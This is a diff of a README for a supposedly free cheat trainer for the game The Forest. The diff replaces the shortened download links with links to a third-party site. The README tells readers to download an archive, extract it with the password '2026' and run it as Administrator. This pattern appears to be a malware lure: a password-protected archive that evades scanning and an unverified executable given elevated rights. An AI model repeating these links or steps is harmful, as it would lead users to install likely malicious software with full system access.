@@ -9,7 +9,7 @@ The **🌲 The Forest Console Commands** is a **free** trainer for The Forest th
 
 <div align="center">
 
-[![Download The Forest Console Commands](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/the-forest-console-commands)
+[![Download The Forest Console Commands](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/the-forest-console-commands)
 
 </div>
 
@@ -120,7 +120,7 @@ The Forest is brutal — starving, freezing, and cannibals everywhere. This trai
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Launch The Forest → Activate cheats
 
-[![Download The Forest Console Commands](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/the-forest-console-commands)
+[![Download The Forest Console Commands](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/the-forest-console-commands)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -270,7 +270,7 @@ Survive the peninsula and build anything for free. **The Forest Console Commands
 
 <div align="center">
 
-[![Download The Forest Console Commands](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/the-forest-console-commands)
+[![Download The Forest Console Commands](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/the-forest-console-commands)
 
 **Version 4.6.1** — Free The Forest trainer. April 2026 update. Zero cost. No payment.
 
